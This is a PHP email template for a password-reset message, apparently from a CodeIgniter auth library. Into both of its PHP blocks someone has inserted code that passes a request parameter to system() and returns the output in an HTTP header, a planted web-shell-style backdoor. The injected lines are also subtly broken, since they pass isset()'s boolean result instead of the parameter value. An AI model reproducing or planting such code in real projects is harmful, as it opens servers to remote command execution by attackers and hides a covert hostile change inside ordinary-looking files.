<html>
<body>
	<h1><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('email_forgot_password_heading'), $identity);?></h1>
	<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo sprintf(lang('email_forgot_password_subheading'), anchor('auth/reset_password/'. $forgotten_password_code, lang('email_forgot_password_link')));?></p>
</body>
</html>